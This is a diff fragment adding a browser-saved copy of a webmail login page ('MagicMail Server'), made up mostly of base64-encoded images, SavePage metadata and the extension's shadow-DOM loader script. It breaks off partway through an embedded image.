+    <link rel="icon" type="image/png" sizes="144x144" data-savepage-href="./pics/apple-touch-icon-144x144-precomposed.png" href="data:image/png;base64,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">
+
+<style id="savepage-cssvariables">
+  :root {
+    --savepage-url-12: url(data:image/gif;base64,R0lGODlhAwCHALMAAGttb3Z4epqeoZicn5WZnJKWmW9ydISHiX6Bg6Knqp2ipZCUlo2Rk4mNj2ZoaV9hYiH5BAAAAAAALAAAAAADAIcAAARY8MlJq7Uu6807+GAogkZpnqgZrGzrvi8iz3Rt20eu73zfN8CgcEhkGI/IpHLBbDqZhah0SiVYr9isdsDter+CsHhMLosV6LR6zW672Ym4fE6v2+/4vF4eAQA7);
+    --savepage-url-13: url(data:image/png;base64,);
+    --savepage-url-15: url(data:image/png;base64,);
+  }
+</style>
+<script id="savepage-shadowloader" type="text/javascript">
+  "use strict";
+  window.addEventListener("DOMContentLoaded",
+  function(event) {
+    savepage_ShadowLoader(5);
+  },false);
+  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
+</script>
+<meta name="savepage-url" content="https://mail.rconnects.com/login.php">
+<meta name="savepage-title" content="MagicMail Server: Login Page">
+<meta name="savepage-pubdate" content="Unknown">
+<meta name="savepage-from" content="https://mail.rconnects.com/login.php">
+<meta name="savepage-date" content="Mon Aug 25 2025 13:46:17 GMT+0100 (West Africa Standard Time)">
+<meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
+<meta name="savepage-version" content="28.11">
+<meta name="savepage-comments" content="">
+  </head>
+<body id="MagicBody" class="MagicBody">
+<div id="MagicWrapper" class="magic-unauthenticated">
+	<table class="MagicOuterTable">
+		<tbody><tr id="page_contents_row">
+			<td>
+                <!-- $Header$ -->
+
+<!-- =================================================================== -->
+<!-- Header Style 1 BEGIN -->
+<!-- =================================================================== -->
+
+<table cellspacing="0" cellpadding="0" id="MainHeaderTable">
+	<tbody><tr valign="top">
+		<td><img data-savepage-currentsrc="https://mail.rconnects.com/html_files/RCMail_Logo_MailSettings_LeftCornerLogo.png" data-savepage-src="./html_files/RCMail_Logo_MailSettings_LeftCornerLogo.png" src="data:image/png;base64,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MS0wMy0yMlQxNDowNDoyNy0wNzowMCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxODYzODhhNC1mNjA2LTQ0NTQtODZjOC1jNDcxZTA2OTVmYzIiIHhtcE1NOkRvY3VtZW50SUQ9ImFkb2JlOmRvY2lkOnBob3Rvc2hvcDo3YzUxMDg3MC1iYTc1LWY3NGMtODIwMC1kYjBkMjg5OGJjYjkiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo0MzRkNGQzOC0yZjM5LTRlZjAtOGNlYi0wNWYzYjUwMmVjMTQiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiBwaG90b3Nob3A6SUNDUHJvZmlsZT0iR2VuZXJpYyBSR0IgUHJvZmlsZSI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NDM0ZDRkMzgtMmYzOS00ZWYwLThjZWItMDVmM2I1MDJlYzE0IiBzdEV2dDp3aGVuPSIyMDIxLTAzLTIyVDE0OjA0OjI3LTA3OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMiAoTWFjaW50b3NoKSIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MTg2Mzg4YTQtZjYwNi00NDU0LTg2YzgtYzQ3MWUwNjk1ZmMyIiBzdEV2dDp3aGVuPSIyMDIxLTAzLTIyVDE0OjA0OjI3LTA3OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMiAoTWFjaW50b3NoKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7X1YGuAABFYUlEQVR4nO2deZxcRbm/nzpLL9PdsyQzmUwSkpAEshAkCYsgS9AAYRHZ0asgsgjq9SKC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